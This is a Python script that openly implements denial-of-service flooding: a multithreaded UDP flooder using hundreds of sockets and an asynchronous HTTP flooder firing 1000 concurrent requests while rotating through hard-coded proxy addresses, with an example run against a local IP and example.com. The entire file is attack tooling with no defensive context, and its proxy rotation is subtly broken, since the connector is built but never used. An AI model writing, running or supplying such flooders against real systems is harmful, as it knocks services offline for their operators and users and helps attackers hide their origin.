#!/usr/bin/env python3
import socket
import random
import threading
import time
import os
import asyncio
import aiohttp
import aiohttp_socks
from itertools import cycle

# Configuration
UDP_PACKET_SIZE = 1200  # Optimal for maximum PPS
HTTP_CONCURRENCY = 1000  # Simultaneous HTTP connections
PROXY_ROTATION = 50      # Rotate proxies every X requests

# High-performance UDP Flood
class UDPFlooder:
    def __init__(self):
        self.sent = 0
        self.running = False
        self.sockets = []

    def create_sockets(self, count=100):
        """Create multiple raw sockets for maximum throughput"""
        for _ in range(count):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1000000)
                sock.setblocking(False)
                self.sockets.append(sock)
            except:
                continue

    def flood(self, target_ip, target_port, duration):
        """Maximize packets per second"""
        payload = os.urandom(UDP_PACKET_SIZE)
        self.running = True
        start_time = time.time()
        
        def send_loop(sock):
            while self.running and time.time() - start_time < duration:
                try:
                    sock.sendto(payload, (target_ip, target_port))
                    self.sent += 1
                except:
                    pass
        
        threads = []
        for sock in self.sockets:
            t = threading.Thread(target=send_loop, args=(sock,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        time.sleep(duration)
        self.running = False
        for t in threads:
            t.join()

# High-volume HTTP Flood
class HTTPFlooder:
    def __init__(self):
        self.proxies = cycle([
            "socks5://51.158.108.165:16379",
            "socks5://104.16.106.234:80",
            "http://35.209.198.222:80",
            "socks5://167.86.95.224:31777"
        ])
        self.requests = 0
        self.running = False

    async def send_request(self, url, session):
        """Send HTTP request with proxy rotation"""
        try:
            async with session.get(url) as resp:
                await resp.read()
                self.requests += 1
        except:
            pass

    async def flood(self, url, duration):
        """Maximize HTTP requests per second"""
        self.running = True
        start_time = time.time()
        
        async with aiohttp.ClientSession() as session:
            while self.running and time.time() - start_time < duration:
                proxy = next(self.proxies)
                conn = aiohttp_socks.ProxyConnector.from_url(proxy)
                tasks = [self.send_request(url, session) for _ in range(HTTP_CONCURRENCY)]
                await asyncio.gather(*tasks, return_exceptions=True)

# Main Execution
if __name__ == "__main__":
    # Example usage:
    udp = UDPFlooder()
    udp.create_sockets(500)  # Create 500 sockets
    udp.flood("192.168.1.100", 80, 60)  # Flood for 60 seconds
    
    http = HTTPFlooder()
    asyncio.run(http.flood("http://example.com", 60))  # HTTP flood for 60s